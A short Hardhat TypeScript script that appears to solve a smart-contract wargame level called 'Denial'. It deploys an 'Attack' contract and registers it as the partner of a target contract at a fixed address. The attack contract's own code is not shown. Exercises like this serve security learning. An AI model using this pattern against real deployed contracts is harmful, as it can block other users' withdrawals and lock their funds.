import { ethers } from "hardhat";
import * as helper from "./helpful_scripts";

async function main() {
    const [account] = await ethers.getSigners();
    const Denial = await helper.getContractAt("Denial", "0x47D15dDEDD081097f9a97413b490AEe82892cDb7");
    const Attack = await helper.deployContract("Attack", Denial.address);

    await helper.waitForTx(Attack.setPartner());

    console.log(await Denial.partner());
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });